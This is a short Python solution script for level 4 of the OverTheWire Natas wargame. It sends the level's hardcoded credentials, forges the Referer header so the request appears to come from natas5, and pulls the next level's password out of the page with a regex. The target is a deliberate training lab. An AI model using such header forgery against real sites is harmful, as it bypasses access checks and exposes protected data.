import requests
import re

username = "natas4"
password = "tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm"

url = "http://"+username+".natas.labs.overthewire.org"
auth = (username, password)
headers = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}

r = requests.get(url, auth=auth, headers= headers)
print(r.text)

print(re.findall(r'natas5 is (.*)', r.text))
